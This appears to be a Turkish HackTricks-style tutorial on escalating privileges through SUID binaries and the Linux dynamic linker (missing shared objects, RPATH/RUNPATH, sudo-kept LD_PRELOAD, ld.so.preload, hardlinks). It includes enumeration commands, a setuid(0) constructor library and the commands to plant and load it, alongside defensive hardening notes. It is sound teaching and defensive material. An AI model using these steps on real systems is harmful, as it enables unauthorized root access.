# SUID Shared Library ve Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binary'leri genellikle doğrudan komut çalıştırma açısından incelenir; ancak özel SUID programları dynamic linker üzerinden de zafiyetli olabilir. Yaygın tema basittir: ayrıcalıklı bir executable, daha düşük ayrıcalıklara sahip bir kullanıcının etkileyebileceği bir path veya configuration üzerinden code yükler.<sup>[[1]](#references)</sup>

Bu sayfa generic technique pattern'larına odaklanır: eksik library'ler, writable library directory'leri, `RPATH`/`RUNPATH`, sudo üzerinden `LD_PRELOAD`, linker configuration ve SUID hardlink confusion.

## Fast Enumeration

Olağandışı SUID file'larını bularak ve bunların dynamic olarak linked olup olmadığını kontrol ederek başlayın:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Standart olmayan konumlara, özel uygulama yollarına, paket yöneticisi tarafından yönetilen dizinlerin dışında bulunan ve root tarafından sahip olunan binary'lere ve yazılabilir dizinlerden yüklenen bağımlılıklara odaklanın.<sup>[[1]](#references)</sup>

Faydalı yazılabilirlik kontrolleri:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Eksik Shared Object Injection

Bazı özel SUID binary'leri mevcut olmayan bir shared object'i yüklemeye çalışır. Eksik yol saldırganın kontrolündeki bir dizinin altındaysa binary, saldırgan tarafından sağlanan kodu etkin kullanıcı olarak yükleyebilir.<sup>[[1]](#references)</sup>

`strace`'in syscall filtresiyle başarısız library aramalarını bulun:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
İkili, `libexample.so` için yazılabilir bir path arıyorsa minimal bir proof library constructor kullanabilir. Doğrulama sırasında proof-of-impact'i zararsız tutun:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Binary’nin yüklemeye çalıştığı tam dosya adıyla derleyin:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
İstismar edilebilir koşul yalnızca eksik library değildir. Saldırgan, ayrıcalıklı loader'ın kabul edeceği bir path'e uyumlu bir shared object yerleştirebilmelidir.<sup>[[1]](#references)</sup>

## Writable Library Directory

Bazen tüm dependencies mevcuttur, ancak bunları çözümlemek için kullanılan directory'lerden biri writable durumdadır. Bu, yüklenmiş bir library'nin değiştirilmesine veya aynı ada sahip daha yüksek öncelikli bir library'nin yerleştirilmesine olanak tanıyabilir.<sup>[[1]](#references)</sup>

Dependency path'lerini inceleyin:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Dizin yazılabilir durumdaysa, bunu bir lab ortamında kopya güvenli bir yaklaşımla doğrulayın. Canlı bir host üzerinde system libraries değiştirmek, aynı anda başlatılan process'lerin library sürümleriyle tutarsız kalmasına neden olabilir.<sup>[[8]](#references)</sup>

## RPATH and RUNPATH

`RPATH` ve `RUNPATH`, loader'a libraries için nerede arama yapacağını bildiren dynamic-section girdileridir. SUID programlarında attacker tarafından yazılabilir dizinleri gösterdiklerinde tehlikelidirler.<sup>[[1]](#references)</sup>

Bunları tespit edin:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Riskli çıktı örneği:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
`/opt/app/lib` yazılabilir durumdaysa ve binary `libcustom.so` gerektiriyorsa, saldırgan buraya kötü amaçlı bir `libcustom.so` yerleştirebilir:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` ve `RUNPATH` tüm çözümleme ayrıntılarında aynı değildir; ancak privilege-escalation incelemesi için pratik soru aynıdır: SUID binary, bir library name için attacker-writable bir directory arıyor mu?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH ve SUID

Normal programlarda `LD_PRELOAD` ve `LD_LIBRARY_PATH`, shared object yüklemesini zorlayabilir veya etkileyebilir. SUID programlarında dynamic loader normalde secure-execution mode'a girer ve tehlikeli environment variable'ları yok sayar.<sup>[[1]](#references)</sup>

Bu, kullanıcının `LD_PRELOAD` ayarlayabilmesi nedeniyle sıradan bir SUID binary'nin genellikle vulnerable olmadığı anlamına gelir:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Yaygın istisna, hedef komut için loader değişkenlerinin ayarlanmasına veya korunmasına izin veren bir sudo policy'sidir. `sudo -l` çıktısında `env_keep+=LD_PRELOAD` veya `env_keep+=LD_LIBRARY_PATH` gibi girdileri inceleyin; hedef dynamically linked ise attacker-controlled code yükleyebilir:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Bu durumları birbiriyle karıştırmayın; yukarıdaki loader ve sudo policy kuralları bunları birbirinden ayırır:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- Normal bir SUID binary'ye karşı `LD_PRELOAD`: genellikle secure execution tarafından engellenir.
- sudo tarafından korunan `LD_PRELOAD`: potansiyel olarak exploit edilebilir.
- Yazılabilir bir path'te eksik `.so`: SUID binary bu path'i doğal olarak yüklediğinde exploit edilebilir.
- Yazılabilir bir directory'ye işaret eden `RPATH`/`RUNPATH`: ihtiyaç duyulan bir library kontrol edilebildiğinde exploit edilebilir.
- `/etc/ld.so.preload` veya linker config yazma erişimi: system-wide ve yüksek etkilidir.

## Linker Configuration

`ld.so`, linker cache'i ve `/etc/ld.so.preload` dosyasını kullanır; `ldconfig` bu cache'i `/etc/ld.so.conf` ve genellikle `/etc/ld.so.conf.d/` içinden dahil edilen dosyalardan oluşturur.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Yüksek değerli kontroller:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration, tek bir vulnerable SUID binary'den genellikle daha ciddidir; çünkü birçok dynamically linked process'i etkileyebilir. `/etc/ld.so.preload` özellikle tehlikelidir; privileged process'lere bir shared object'i zorla yükleyebilir.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlink'ler, aynı SUID inode'un birden fazla isim altında görünmesini sağlayabilir.<sup>[[9]](#references)</sup> Bu, privileged bir helper'ı gizlemek, cleanup işlemlerini karıştırmak veya naif path tabanlı incelemeyi atlatmak için kullanılabilir.

Birden fazla link'i olan SUID dosyalarını bulun:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Aynı inode'a giden tüm yolları inceleyin:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Abuse, bir hardlink'in izinleri değiştirmesi değildir. Abuse, ayrıcalıklı bir inode'a savunucuların veya script'lerin beklemediği bir ad üzerinden erişilebilmesidir.<sup>[[9]](#references)</sup> Daha ayrıntılı inode ve hardlink iş akışı için [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md) bölümüne bakın.

## Defensive Notes

- SUID binary'lerini mümkün olduğunca minimal, denetlenmiş ve package-managed tutun.
- Yazılabilir veya application-managed dizinleri gösteren `RPATH`/`RUNPATH` girişlerinden kaçının.<sup>[[1]](#references)[[8]](#references)</sup>
- Library dizinlerinin root-owned olmasını ve normal kullanıcılar tarafından yazılamamasını sağlayın.<sup>[[8]](#references)</sup>
- `LD_PRELOAD`, `LD_LIBRARY_PATH` veya benzer loader variable'larının sudo üzerinden korunmasına izin vermeyin.<sup>[[1]](#references)[[5]](#references)</sup>
- `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` ve beklenmeyen SUID dosyalarını izleyin.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Hardlink'lenmiş SUID dosyalarını inceleyin ve standart system path'lerinin dışındaki özel SUID wrapper'larını araştırın.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux manual page](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux manual page](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker Hardening (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
